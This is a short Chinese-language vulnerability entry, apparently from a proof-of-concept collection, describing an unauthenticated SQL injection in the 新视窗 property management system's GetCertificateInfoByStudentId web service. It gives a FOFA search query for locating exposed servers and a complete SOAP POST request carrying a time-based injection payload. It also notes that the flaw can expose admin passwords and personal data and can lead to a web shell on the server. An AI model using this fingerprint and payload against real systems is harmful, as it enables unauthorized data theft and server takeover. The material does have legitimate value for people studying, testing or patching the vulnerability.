## 新视窗新一代物业管理系统GetCertificateInfoByStudentId存在SQL注入漏洞

新视窗新一代物业管理系统的XML Web services接囗GetCertifcatelnfoBvStudentld 实例处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```
body="BPMSite/ClientSupport/OCXInstall.aspx"
```

## poc

```
POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
Host: your-ip
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
      <studentId>1;WAITFOR DELAY '0:0:5'--</studentId>
    </GetCertificateInfoByStudentId>
  </soap:Body>
</soap:Envelope>
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211840774.png)